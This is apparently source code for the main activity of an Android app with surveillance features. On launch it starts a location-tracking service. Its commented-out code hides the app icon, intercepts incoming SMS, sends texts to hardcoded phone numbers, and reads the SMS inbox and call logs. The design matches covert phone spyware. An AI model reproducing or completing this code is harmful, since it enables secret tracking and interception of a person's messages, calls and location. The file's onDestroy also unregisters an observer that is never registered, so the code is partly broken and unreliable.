package com.byc.ctL;


import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.WindowManager;
import android.widget.Toast;

public class MainActivity extends Activity  {
	private SmsReceiver smsReceiver;
	private IntentFilter receiveFilter;
	private SmsObserver smsObserver;
	private Uri SMS_INBOX = Uri.parse("content://sms/"); 
	private GetUserInfo getUserInfo;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		//getWindow().setFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON, WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
		setContentView(R.layout.activity_main);
		//Toast.makeText(MainActivity.this, "开始运行！", Toast.LENGTH_LONG).show();
		//隐藏 ：
		//PackageManager p = getPackageManager();
		//p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		Toast.makeText(MainActivity.this, "开始运行！", Toast.LENGTH_LONG).show();
        //定位服务:
        //LocationUtil.getInstance(this);
        //LocationUtil.fromListenerGetLocation();
        //LocationUtil.fromWIFILocation();
		//启动service
        //Intent startIntent = new Intent(this, MyService.class);  
        //startService(startIntent); 
        //
        //Intent stopIntent = new Intent(this, MyService.class);  
        //stopService(stopIntent); 
		//启动service
        Intent startIntent2 = new Intent(this, LocationSvc.class);  
        startService(startIntent2); 
        //注册短信接收广播：
        //receiveFilter = new IntentFilter();
        //receiveFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        //receiveFilter.setPriority(100);
        //smsReceiver = new SmsReceiver();
        //registerReceiver(smsReceiver, receiveFilter);
        //发送短信：
        
        //SmsSend ss=SmsSend.getSmsSend(this);
        //ss.doSendSMSTo("13069816035", "1",MainActivity.this);
        //ss.sendSMS("15911870978", "1");
        //打开写短信数据库：
        //Intent intent = new Intent(Intent.ACTION_MAIN);  
        //ComponentName cn = new ComponentName("com.android.settings", "com.android.settings.Settings");  
        //intent.setComponent(cn);  
        //intent.putExtra(":android:show_fragment", "com.android.settings.applications.AppOpsSummary");  
        //startActivity(intent);  
        //获取短信从数据库：
        //smsObserver = new SmsObserver(this, null);
		//getContentResolver().registerContentObserver(SMS_INBOX, true,
		//		smsObserver);
		//获取用户信息：
		//getUserInfo=GetUserInfo.getUserInfo(this);
		//getUserInfo.getSmsInPhone();
		//getUserInfo.GetCallsInPhone();
		
	}
	protected void onDestroy() {

		super.onDestroy();

		//unregisterReceiver(smsReceiver);
		getContentResolver().unregisterContentObserver(smsObserver);

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
}
